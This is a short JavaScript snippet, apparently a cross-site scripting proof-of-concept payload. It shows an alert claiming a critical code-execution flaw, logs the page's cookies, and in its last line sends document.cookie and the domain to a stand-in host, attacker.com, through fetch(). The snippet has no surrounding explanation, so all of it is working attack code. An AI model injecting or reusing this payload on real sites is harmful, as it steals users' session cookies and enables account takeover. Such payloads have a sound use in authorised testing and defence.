alert("CRITICAL VULNERABILITY CONFIRMED! Arbitrary code execution in: " + document.domain);
console.log("Cookies:", document.cookie);
fetch("https://attacker.com/exfil?cookie=" + encodeURIComponent(document.cookie) + "&domain=" + document.domain);